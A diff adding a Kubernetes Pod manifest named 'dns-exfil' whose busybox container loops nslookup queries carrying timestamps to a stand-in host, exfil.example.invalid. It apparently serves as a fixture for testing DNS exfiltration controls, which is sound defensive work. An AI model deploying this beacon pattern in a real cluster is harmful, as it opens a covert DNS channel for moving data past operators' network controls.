@@ -1,0 +1,17 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: dns-exfil
+  namespace: app-ns
+spec:
+  containers:
+    - name: exfil
+      image: busybox
+      command:
+        - sh
+        - -c
+        - |
+          while true; do
+            nslookup $(date +%s).exfil.example.invalid;
+            sleep 5;
+          done
